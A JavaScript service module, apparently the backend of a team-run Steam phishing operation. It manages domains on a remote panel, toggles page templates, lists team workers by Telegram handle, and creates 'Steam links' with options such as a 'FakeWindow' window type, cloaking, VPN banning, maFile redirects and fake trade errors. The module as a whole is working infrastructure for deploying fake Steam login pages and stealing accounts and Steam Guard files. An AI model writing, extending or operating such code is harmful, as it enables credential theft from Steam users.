const {
  getPanelToken,
  filterAvailableDomains,
} = require("../handlers/sitesHandler");
const {
  getDomains,
  checkDomainAvailability,
  getActualIPs,
  createDomain,
  deleteDomain,
  getSteamLinks,
  findTemplateById,
  createSteamLink,
  getTeamWorkers,
  formatPanelError,
  normalizeWindowType,
} = require("./apiService");
const { clearTeamReferralForDomain } = require("./userService");
const {
  getVisibleTemplates,
  addVisibleTemplate,
  removeVisibleTemplate,
  renameVisibleTemplate,
  isTemplateVisible,
  normalizeTemplateId,
} = require("./settingsService");

function pickActualIp(ips) {
  if (Array.isArray(ips)) return ips[0] || "";
  if (typeof ips === "string") return ips;
  return ips?.ip || ips?.[0] || "";
}

function serializeDomain(domain, ownerId) {
  const own = Number(domain?.owner) === Number(ownerId);
  return {
    id: domain.id,
    domain: domain.domain || "",
    online: Number(domain.online || 0),
    owner: domain.owner ?? null,
    isOwn: own,
    isTeamPublic: domain.isTeamPublic === true,
    ip: domain.ip || "",
    service: domain.service || "Steam",
    status: domain.status || "",
  };
}

function serializeLink(link) {
  return {
    id: link.id,
    path: link.path || "",
    url: link.url || link.link || "",
    windowType: link.windowType || "",
    template: link.template ?? link.templateId ?? null,
    templateName: link.templateName || link.template?.name || "",
    owner: link.owner ?? null,
  };
}

async function withAdminPanel(adminUser, fn) {
  try {
    const auth = await getPanelToken(adminUser);
    return await fn(auth);
  } catch (error) {
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

async function listDomains(adminUser) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const rows = filterAvailableDomains(payload?.rows || [], ownerId).map((d) =>
      serializeDomain(d, ownerId)
    );
    return {
      ownerId,
      panelUsername: adminUser.panelUsername || "",
      totalOnline: rows.reduce((sum, row) => sum + row.online, 0),
      ownCount: rows.filter((row) => row.isOwn).length,
      domains: rows,
    };
  });
}

async function getDomainDetail(adminUser, domainId) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
      (row) => Number(row.id) === Number(domainId)
    );
    if (!domain) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }
    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
    const links = (linksPayload?.rows || []).map(serializeLink);
    return {
      ownerId,
      domain: serializeDomain(domain, ownerId),
      links,
    };
  });
}

async function previewAddDomain(adminUser, domainName) {
  const domain = String(domainName || "")
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "");
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    const err = new Error("Укажите корректный домен, например example.com");
    err.status = 400;
    throw err;
  }
  return withAdminPanel(adminUser, async ({ token }) => {
    const check = await checkDomainAvailability(token, domain);
    if (!check.available) {
      const err = new Error(check.message || "Домен недоступен или уже занят");
      err.status = 409;
      throw err;
    }
    const ip = pickActualIp(await getActualIPs(token));
    return { domain, ip, available: true };
  });
}

async function addDomain(adminUser, domainName) {
  const preview = await previewAddDomain(adminUser, domainName);
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const created = await createDomain(token, {
      domain: preview.domain,
      type: "IP",
      service: "Steam",
      isPublic: false,
      isTransit: false,
    });
    return {
      created: serializeDomain(
        {
          id: created?.id || created?.data?.id,
          domain: created?.domain || preview.domain,
          online: 0,
          owner: ownerId,
          ip: created?.ip || preview.ip,
          service: "Steam",
        },
        ownerId
      ),
      bindIp: preview.ip,
    };
  });
}

async function removeDomain(adminUser, domainId) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = (payload?.rows || []).find((row) => Number(row.id) === Number(domainId));
    if (!domain) {
      const err = new Error("Домен не найден");
      err.status = 404;
      throw err;
    }
    if (Number(domain.owner) !== Number(ownerId)) {
      const err = new Error("Можно удалить только свой домен");
      err.status = 403;
      throw err;
    }
    await deleteDomain(token, domainId);
    await clearTeamReferralForDomain(adminUser.telegramId, domainId);
    return { ok: true };
  });
}

async function listTemplates(_adminUser) {
  const templates = await getVisibleTemplates();
  return {
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
      preview: t.preview || "",
    })),
  };
}

async function listTemplateVisibility(_adminUser) {
  const templates = await getVisibleTemplates();
  return {
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
      preview: t.preview || "",
      enabled: true,
    })),
  };
}

async function enableTemplateById(adminUser, templateId, { name } = {}) {
  const id = normalizeTemplateId(templateId);
  if (!id) {
    const err = new Error("Укажите корректный ID шаблона");
    err.status = 400;
    throw err;
  }
  const customName = String(name || "").trim().slice(0, 80);
  let found = null;
  try {
    found = await withAdminPanel(adminUser, async ({ token }) => findTemplateById(token, id));
  } catch {
    // Можно включить ID без каталога uproject — имя подставится позже.
  }
  const templates = await addVisibleTemplate({
    id,
    name: customName || found?.name || `Template #${id}`,
    preview: found?.preview || "",
  });
  return {
    templates,
    template: templates.find((row) => row.id === id),
    resolved: Boolean(found),
    customName: Boolean(customName),
  };
}

async function renameTemplateById(_adminUser, templateId, name) {
  try {
    const templates = await renameVisibleTemplate(templateId, name);
    const id = normalizeTemplateId(templateId);
    return {
      templates,
      template: templates.find((row) => row.id === id),
    };
  } catch (error) {
    const err = new Error(error.message || "Не удалось переименовать");
    err.status = 400;
    throw err;
  }
}

async function disableTemplateById(_adminUser, templateId) {
  const id = normalizeTemplateId(templateId);
  if (!id) {
    const err = new Error("Укажите корректный ID шаблона");
    err.status = 400;
    throw err;
  }
  const templates = await removeVisibleTemplate(id);
  return { templates };
}

async function createLink(adminUser, domainId, { path = "", templateId, windowType } = {}) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
      (row) => Number(row.id) === Number(domainId)
    );
    if (!domain) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }
    const tpl = Number(templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Выберите шаблон");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }
    const cleanPath = String(path || "").trim().replace(/^\/+/, "");
    const created = await createSteamLink(token, {
      path: cleanPath,
      windowType: normalizeWindowType(windowType || "FakeWindow"),
      domain: Number(domainId),
      template: tpl,
      cloaking: false,
      ban_vpn: false,
      iframe: true,
      logError: true,
      mafileError: false,
      mafileSteamRedirect: true,
      tradeError: true,
      randPath: !cleanPath,
    });
    return { link: serializeLink(created?.data || created || {}) };
  });
}

async function listWorkers(adminUser) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getTeamWorkers(token, 0, 100);
    const rows = (payload?.rows || []).map((row) => ({
      id: row.id,
      username: row.username || "",
      telegram: row.telegram || "",
      isOwner: Number(row.id) === Number(ownerId),
    }));
    return { ownerId, workers: rows };
  });
}

module.exports = {
  listDomains,
  getDomainDetail,
  previewAddDomain,
  addDomain,
  removeDomain,
  listTemplates,
  listTemplateVisibility,
  enableTemplateById,
  renameTemplateById,
  disableTemplateById,
  createLink,
  listWorkers,
};
